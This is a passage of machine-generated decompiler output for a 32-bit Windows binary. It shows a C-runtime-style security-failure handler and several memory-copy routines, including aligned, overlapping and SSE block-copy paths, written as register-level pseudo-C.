	globals->ptr13144164 = fp + 0x04;
	globals->dw131440A0 = 0x00010001;
	globals->ptr13144054 = globals->ptr13144158;
	globals->dw13144048 = 0xC0000409;
	globals->dw1314404C = 0x01;
	globals->t13144098 = IsDebuggerPresent();
	fn1314276D();
	SetUnhandledExceptionFilter(null);
	UnhandledExceptionFilter(&globals->t131412D8);
	if (globals->t13144098 == 0x00)
		fn1314276D();
	return TerminateProcess(GetCurrentProcess(), 0xC0000409);
}

// 131420F0: FlagGroup bool fn131420F0(Stack Eq_67 dwArg04, Stack Eq_67 dwArg08, Stack Eq_67 dwArg0C, Register out (ptr Eq_486) ebpOut, Register out ptr32 esiOut, Register out (ptr Eq_488) ediOut)
bool fn131420F0(Eq_67 dwArg04, Eq_67 dwArg08, Eq_67 dwArg0C, Eq_486 * & ebpOut, ptr32 & esiOut, Eq_488 * & ediOut)
{
	word32 eax_20 = dwArg0C + dwArg08;
	if (dwArg04 <= dwArg08 || dwArg04 >= eax_20)
	{
		if (dwArg0C < 0x0100 || (globals->dw13144378 == 0x00 || (dwArg04 & 0x0F) != (dwArg08 & 0x0F)))
		{
			Eq_67 esi_51 = dwArg08;
			Eq_67 edi_52 = dwArg04;
			if ((dwArg04 & 0x03) != 0x00)
			{
				if (dwArg0C >= 0x04)
				{
					word32 esp_89;
					word32 ebp_90;
					word32 edi_91;
					word32 esi_92;
					word32 ecx_93;
					word32 eax_94;
					word32 edx_95;
					byte SCZO_96;
					byte CZ_97;
					byte C_98;
					byte Z_99;
					byte SZO_100;
					word32 ebx_101;
					bool D_102;
					(*((char *) globals->a13142178 + (dwArg04 & 0x03) * 0x04))();
					return D_102;
				}
			}
			else
			{
				uint32 ecx_57 = dwArg0C >> 0x02;
				if (dwArg0C >> 0x02 >= 0x08)
				{
					while (ecx_57 != 0x00)
					{
						*edi_52 = *esi_51;
						esi_51 = (word32) esi_51 + 0x04;
						edi_52 = (word32) edi_52 + 0x04;
						ecx_57 = ecx_57 - 0x01;
					}
					switch (dwArg0C & 0x03)
					{
					case 0x00:
						word32 esi_72;
						*esiOut = esi;
						word32 edi_74;
						*ediOut = edi;
						word32 ebp_76;
						*ebpOut = ebp;
						return D;
					}
				}
			}
		}
		else
		{
			word32 esi_117;
			*esiOut = esi;
			word32 edi_119;
			*ediOut = edi;
			word32 ebp_121;
			*ebpOut = ebp;
			fn13142676(dwArg04, dwArg08, dwArg0C);
			return D;
		}
	}
	else
	{
		word32 * esi_126 = (word32) dwArg08 + (dwArg0C - 0x04);
		word32 * edi_127 = (word32) dwArg04 + (dwArg0C - 0x04);
		if ((edi_127 & 0x03) != 0x00)
		{
			if (dwArg0C >= 0x04)
			{
				word32 esp_178;
				word32 ebp_179;
				word32 edi_180;
				word32 esi_181;
				word32 ecx_182;
				word32 eax_183;
				word32 edx_184;
				byte SCZO_185;
				byte CZ_186;
				byte C_187;
				byte Z_188;
				byte SZO_189;
				word32 ebx_190;
				bool D_191;
				(*((char *) globals->a13142304 + (edi_127 & 0x03) * 0x04))();
				return D_191;
			}
		}
		else
		{
			uint32 ecx_131 = dwArg0C >> 0x02;
			if (dwArg0C >> 0x02 < 0x08)
			{
				uint32 ecx_153 = -(dwArg0C >> 0x02);
				word32 esp_156;
				word32 ebp_157;
				word32 edi_158;
				word32 esi_159;
				word32 ecx_160;
				word32 eax_161;
				word32 edx_162;
				byte SCZO_163;
				byte CZ_164;
				byte C_165;
				byte Z_166;
				byte SZO_167;
				word32 ebx_168;
				bool D_169;
				(*((char *) globals->a131423B0 + ecx_153 * 0x04))();
				return D_169;
			}
			else
			{
				while (ecx_131 != 0x00)
				{
					*edi_127 = *esi_126;
					esi_126 = esi_126 - 0x04;
					edi_127 = edi_127 - 0x04;
					ecx_131 = ecx_131 - 0x01;
				}
				switch (dwArg0C & 0x03)
				{
				case 0x00:
					word32 esi_147;
					*esiOut = esi;
					word32 edi_149;
					*ediOut = edi;
					word32 ebp_151;
					*ebpOut = ebp;
					return false;
				}
			}
		}
	}
}

// 131425EF: void fn131425EF(Stack Eq_67 dwArg04, Stack Eq_67 dwArg08, Stack Eq_67 dwArg0C)
void fn131425EF(Eq_67 dwArg04, Eq_67 dwArg08, Eq_67 dwArg0C)
{
	Eq_67 esi_12 = dwArg08;
	Eq_67 edi_14 = dwArg04;
	uint32 ecx_17 = dwArg0C >> 0x07;
	do
	{
		word128 xmm1_24 = *((word32) esi_12 + 0x0010);
		word128 xmm2_25 = *((word32) esi_12 + 0x0020);
		word128 xmm3_26 = *((word32) esi_12 + 0x0030);
		*edi_14 = *esi_12;
		*((word32) edi_14 + 0x0010) = xmm1_24;
		*((word32) edi_14 + 0x0020) = xmm2_25;
		*((word32) edi_14 + 0x0030) = xmm3_26;
		word128 xmm5_32 = *((word32) esi_12 + 0x0050);
		word128 xmm6_33 = *((word32) esi_12 + 0x0060);
		word128 xmm7_34 = *((word32) esi_12 + 112);
		*((word32) edi_14 + 0x0040) = *((word32) esi_12 + 0x0040);
		*((word32) edi_14 + 0x0050) = xmm5_32;
		*((word32) edi_14 + 0x0060) = xmm6_33;
		*((word32) edi_14 + 112) = xmm7_34;
		esi_12 = (word32) esi_12 + 0x0080;
		edi_14 = (word32) edi_14 + 0x0080;
		ecx_17 = ecx_17 - 0x01;
	} while (ecx_17 != 0x00);
}

// 13142676: void fn13142676(Stack Eq_67 dwArg04, Stack Eq_67 dwArg08, Stack Eq_67 dwArg0C)
void fn13142676(Eq_67 dwArg04, Eq_67 dwArg08, Eq_67 dwArg0C)
{
	esp = fp;
	esp = fp - 0x04;
	dwLoc04 = ebp;
	ebp = fp - 0x04;
	esp = fp - 0x20;
	dwLoc10 = edi;
	dwLoc0C = esi;
	dwLoc08 = ebx;
	ebx = dwArg08;
	eax = ebx;
	edx_eax = (int64) eax;
	eax = (word32) edx_eax;
	edx = SLICE(edx_eax, word32, 32);
	ecx = eax;
	eax = dwArg04;
	ecx = ecx ^ edx;
	ecx = ecx - edx;
	ecx = ecx & 0x0F;
	ecx = ecx ^ edx;
	ecx = ecx - edx;
	edx_eax = (int64) eax;
	eax = (word32) edx_eax;
	edx = SLICE(edx_eax, word32, 32);
	edi = eax;
	edi = edi ^ edx;
	edi = edi - edx;
	edi = edi & 0x0F;
	edi = edi ^ edx;
	edi = edi - edx;
	edx = ecx;
	edx = edx | edi;
	edx_eax = SEQ(edx, eax);
	SZO = cond(edx);
	Z = SZO;
	C = false;
	if (Test(EQ,Z))
	{
		esi = dwArg0C;
		ecx = esi;
		ecx = ecx & 0x7F;
		dwLoc1C = ecx;
		SCZO = cond(esi - ecx);
		Z = SCZO;
		if (Test(NE,Z))
		{
			esi = esi - ecx;
			SCZO = cond(esi);
			esp = fp - 0x24;
			dwLoc24 = esi;
			esp = fp - 0x28;
			dwLoc28 = ebx;
			esp = fp - 44;
			dwLoc2C = eax;
			fn131425EF(dwLoc2C, dwLoc28, dwLoc24);
			esp = fp - 0x20;
			SCZO = cond(fp - 0x20);
			eax = dwArg04;
			edx_eax = SEQ(edx, eax);
			ecx = dwLoc1C;
		}
		SZO = cond(ecx & ecx);
		Z = SZO;
		C = false;
		if (Test(NE,Z))
		{
			ebx = dwArg0C;
			edx = dwArg08;
			edx = edx + ebx;
			edx = edx - ecx;
			dwLoc18 = edx;
			ebx = ebx + eax;
			ebx = ebx - ecx;
			SCZO = cond(ebx);
			dwLoc14 = ebx;
			esi = dwLoc18;
			edi = dwLoc14;
			ecx = dwLoc1C;
			while (ecx != 0x00)
			{
				v15 = *esi;
				*edi = v15;
				esi = (word32) esi + 0x01;
				edi = (word32) edi + 0x01;
				ecx = ecx - 0x01;
			}
			eax = dwArg04;
		}
	}
	else
	{
		SCZO = cond(ecx - edi);
		Z = SCZO;
		if (Test(EQ,Z))
		{
			ecx = -ecx;
			ecx = (word32) ecx + 0x0010;
			SCZO = cond(ecx);
			dwLoc20 = ecx;
			esi = dwArg08;
			edi = dwArg04;
			ecx = dwLoc20;
			while (ecx != 0x00)
			{
				v16 = *esi;
				*edi = v16;
				esi = (word32) esi + 0x01;
				edi = (word32) edi + 0x01;
				ecx = ecx - 0x01;
			}
			ecx = dwArg04;
			ecx = ecx + dwLoc20;
			edx = dwArg08;
			edx = edx + dwLoc20;
			eax = dwArg0C;
			eax = eax - dwLoc20;
			SCZO = cond(eax);
			esp = fp - 0x24;
			dwLoc24 = eax;
			esp = fp - 0x28;
			dwLoc28 = edx;
			esp = fp - 44;
			dwLoc2C = ecx;
			fn13142676(dwLoc2C, dwLoc28, dwLoc24);
			esp = fp - 0x28;
			esp = fp - 0x1C;
			SCZO = cond(fp - 0x1C);
			eax = dwArg04;
		}
		else
		{
			esi = dwArg08;
			edi = dwArg04;
			ecx = dwArg0C;
			edx = ecx;
			ecx = ecx >> 0x02;
			SCZO = cond(ecx);
			while (ecx != 0x00)
			{
				v17 = *esi;
				*edi = v17;
				esi = (word32) esi + 0x04;
				edi = (word32) edi + 0x04;
				ecx = ecx - 0x01;
			}
			ecx = edx;
			ecx = ecx & 0x03;
			SZO = cond(ecx);
			C = false;
			while (ecx != 0x00)
			{
				v18 = *esi;
				*edi = v18;
				esi = (word32) esi + 0x01;
				edi = (word32) edi + 0x01;
				ecx = ecx - 0x01;
			}
			eax = dwArg04;
		}
	}
	ebx = dwLoc08;
	esi = dwLoc0C;
	edi = dwLoc10;
	esp = fp - 0x04;
	ebp = dwLoc04;
	esp = fp;
}

// 1314276D: void fn1314276D()
void fn1314276D()
{
	globals->dw13144370 = globals->dw13144370 & 0x00;
}

